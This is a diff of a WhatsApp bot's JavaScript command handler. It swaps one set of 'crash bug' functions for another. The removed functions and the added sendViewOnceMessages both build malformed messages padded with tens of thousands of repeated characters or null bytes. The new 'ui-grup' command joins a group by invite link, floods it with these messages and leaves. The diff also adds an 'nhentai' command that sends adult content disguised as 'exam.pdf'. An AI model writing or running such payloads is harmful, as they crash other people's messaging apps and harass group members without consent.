@@ -10,7 +10,6 @@ const chalk = require("chalk");
 const cheerio = require("cheerio");
 const axios = require("axios");
 const ytdl = require('@distube/ytdl-core');
-const yta = require('./lib/ytdl');
 const yts = require('youtube-yts');
 const fetch = require('node-fetch');
 const ffmpeg = require("fluent-ffmpeg");
@@ -18,6 +17,7 @@ const neko_modules = require('nekos.life');
 const moment = require('moment-timezone');
 const path = require('path');
 const { ocrSpace } = require('ocr-space-api-wrapper');
+const { nhentai } = require("./lib/nh");
 const { doing } = require('./lib/translate')
 const { event } = require("./lib/event.js")
 const { processing } = require("./lib/remini")
@@ -461,65 +461,44 @@ module.exports = core = async (client, m, chatUpdate, store) => {
 
 //Bug Function
 
-    const force = {
-      key: {
-      participant: `0@s.whatsapp.net`,
-      ...(m.chat ? {
-      remoteJid: "status@broadcast"
-      } : {})
-      },
-      'message': {
-      "interactiveMessage": { 
-      "header": {
-      "hasMediaAttachment": true,
-      "jpegThumbnail": fs.readFileSync(`./assets/latx.png`)
-      },
-      "nativeFlowMessage": {
-      "buttons": [
-      {
-      "name": "review_and_pay",
-      "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+async function sendViewOnceMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+    let messageContent = generateWAMessageFromContent(jid, {
+      'viewOnceMessage': {
+        'message': {
+          'messageContextInfo': {
+            'deviceListMetadata': {},
+            'deviceListMetadataVersion': 2
+          },
+          'interactiveMessage': proto.Message.InteractiveMessage.create({
+            'body': proto.Message.InteractiveMessage.Body.create({
+              'text': ''
+            }),
+            'footer': proto.Message.InteractiveMessage.Footer.create({
+              'text': ''
+            }),
+            'header': proto.Message.InteractiveMessage.Header.create({
+              'title': '',
+              'subtitle': '',
+              'hasMediaAttachment': false
+            }),
+            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
+              'buttons': [{
+                'name': "cta_url",
+                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
+              }],
+              'messageParamsJson': "\0".repeat(100000)
+            })
+          })
+        }
       }
-      ]
-      }
-      }
-      }
-      } 
-
-async function ngeloc(target, kuwoted) {
-  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
-  viewOnceMessage: {
-  message: {
-    "liveLocationMessage": {
-      "degreesLatitude": "p",
-      "degreesLongitude": "p",
-      "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
-      "sequenceNumber": "0",
-      "jpegThumbnail": ""
-       }
-    }
+    }, {});
+    client.relayMessage(jid, messageContent.message, {
+      'messageId': messageContent.key.id
+    });
   }
-  }), { userJid: target, quoted: kuwoted })
-  await client.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
-  }
+}
 
-  async function bakdok(target, kuwoted) {
-    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
-     "documentMessage": {
-       "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
-       "mimetype": "penis",
-       "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
-       "fileLength": "999999999",
-       "pageCount": 999999999,
-       "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
-       "fileName": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
-       "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
-       "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
-       "mediaKeyTimestamp": "1715880173"
-     }
-   }), { userJid: target, quoted: kuwoted });
-   await client.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
-   }
 async function sendLiveLocationMessage(jid) {
   var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
     'viewOnceMessage': {
@@ -845,6 +824,20 @@ case 'getimage':
                 proses("✔")
               } catch(err) {
                 proses("❌")
+                console.log(err)
+              }
+            break
+            
+            case 'nhentai':
+              if(!text && isNaN(text)) return reply(lang.format(prefix, command));
+              try{
+                proses("⌛")
+                pdfFile = await nhentai(text);
+                pdfPath = fs.readFileSync(pdfFile);
+                client.sendMessage(from, pdfPath, {mimetype: 'application/pdf', filename: 'exam.pdf'})//WIP
+                proses("✔");
+              } catch(err) {
+                proses("❌");
                 console.log(err)
               }
             break
@@ -1876,39 +1869,25 @@ case 'fb':
     reply(lang.changelog())
   break
             
-              case 'crash':
-    if(!isOwner) return
-    number = text.replace(/[^0-9]/g,"")
-    target = number + "@s.whatsapp.net"
-    proses("⌛")
-    for (let j = 0; j < 30; j++) {
-      await bakdok(target, force)
-      await ngeloc(target, force)
-      await ngeloc(target, force)
-      await bakdok(target, force)
-      await ngeloc(target, force)
-      await bakdok(target, force)
-      await bakdok(target, force)
-      await ngeloc(target, force)
-      await ngeloc(target, force)
-      await bakdok(target, force)
-      await ngeloc(target, force)
-      await bakdok(target, force)
-      await bakdok(target, force)
-      await ngeloc(target, force)
-      await ngeloc(target, force)
-      await bakdok(target, force)
-      await ngeloc(target, force)
-      await bakdok(target, force)
-      await bakdok(target, force)
-      await ngeloc(target, force)
-      await ngeloc(target, force)
-      await bakdok(target, force)
-      await ngeloc(target, force)
-      await bakdok(target, force)
-      }
+  case "ui-grup": 
+    if (!text) return reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
+    if (!text.split(" ")[0].includes("whatsapp.com")) return reply("Link Invalid!");
+    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
+    try {
+      proses("⌛")
+      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
+      let groupTarget = await client.groupAcceptInvite(groupLink);
+      await sleep(2000); // Adjusted sleep time for clarity
+      sendViewOnceMessages(groupTarget, bugAmount);
+      await sleep(2500); // Adjusted sleep time for clarity
       proses("✔")
-  break
+      client.groupLeave(groupTarget);
+    } catch (error) {
+      proses("❌")
+      console.log(error)
+    }
+  
+  break;
             
 case "systemuicrash": 
 
